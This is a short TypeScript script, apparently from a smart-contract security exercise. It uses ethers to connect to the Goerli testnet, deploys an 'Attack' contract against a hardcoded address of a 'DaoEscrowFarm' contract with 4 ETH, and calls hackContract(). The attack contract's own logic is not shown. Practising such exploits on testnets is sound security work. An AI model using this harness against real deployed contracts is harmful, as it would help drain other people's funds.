import { ethers } from "ethers"; // Hardhat for testing
import "dotenv/config";
import * as FARMJSON from "../artifacts/contracts/DaoEscrowFarm.sol/DaoEscrowFarm.json";
import * as ATTACKJSON from "../artifacts/contracts/Attack.sol/Attack.json";
// eslint-disable-next-line node/no-missing-import
import { Attack, DaoEscrowFarm } from "../typechain-types";

async function main() {
  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY!);
  console.log(`Using address ${wallet.address}`);
  const provider = ethers.providers.getDefaultProvider("goerli");
  const signer = wallet.connect(provider);

  // console.log("Deploying Escrow farm contract");
  // const FarmFactory = new ethers.ContractFactory(
  //   FARMJSON.abi,
  //   FARMJSON.bytecode,
  //   signer
  // );

  // const EFarmContract = (await FarmFactory.deploy()) as DaoEscrowFarm;
  // await EFarmContract.deployed();
  
  // console.log(
  //   "Completed Escrow Farm deployment at %s",
  //  EFarmContract.address
  // );
  // Now deploy Attack
  console.log("Deploying Attack Contract");
  const AttackFactory = new ethers.ContractFactory(
    ATTACKJSON.abi,
    ATTACKJSON.bytecode,
    signer
  );
  // address of deployed contract
  const AttackContract = (await AttackFactory.deploy("0xd46DA3234eB913085898fB1610b93382A93E9800", {value: ethers.utils.parseEther("4")})) as Attack;
  await AttackContract.deployed();
  console.log("Completed Attack deployment at %s", AttackContract.address);
  console.log("Attacking now");
  AttackContract.connect(signer).hackContract();
  
  
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
